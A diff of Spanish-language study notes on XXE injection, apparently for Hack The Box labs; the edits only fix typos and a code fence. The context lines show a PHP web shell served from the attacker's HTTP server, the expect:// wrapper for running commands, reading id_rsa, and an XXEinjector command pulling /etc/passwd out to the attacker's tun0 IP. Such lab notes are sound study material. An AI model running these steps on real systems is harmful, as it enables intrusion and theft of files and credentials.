@@ -103,7 +103,7 @@ con esto podemos leer incluso id_rsa para entrar al puerto ssh.
 ### RCE
 Si la web usa php y tiene el filtro expect entonces se pueden tirar comandos básicos `expect://id` pero la forma más eficiente es esta : 
 
-1. ```
+1. 
 ```
 bonack@htb[/htb]$ echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
 bonack@htb[/htb]$ sudo python3 -m http.server 80
@@ -166,7 +166,7 @@ Cuando lo anterior no nos funciona  o cuando la web no usa php o cuando no nos e
 ]>
 ```
 
-la ultima parte del joined debería hacer que lo que queremos ver se enseñe pero xml no deja juntar entidades externas con internas , para bypassearlo usaremos `XML Parameter Entities` que es un tipo especial de entity que se referencia con % y que solo se puede usar en un DTD(explicacion de DTD en el apartado de basics)
+la última parte del joined debería hacer que lo que queremos ver se enseñe pero xml no deja juntar entidades externas con internas , para bypassearlo usaremos `XML Parameter Entities` que es un tipo especial de entity que se referencia con % y que solo se puede usar en un DTD(explicacion de DTD en el apartado de basics)
 
 PASOS:
 
@@ -279,4 +279,4 @@ bonack@htb[/htb]$ ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/t
 [+] Responding with XML for: /etc/passwd
 [+] Retrieved data:
 ```
-Todo lo que encuentr se mete en un folder de logs que aparecerá nuevo, no hace falta levantar ningun server python el ya lo hace solo
+Todo lo que encuentra se mete en un folder de logs que aparecerá nuevo, no hace falta levantar ningun server python el ya lo hace solo
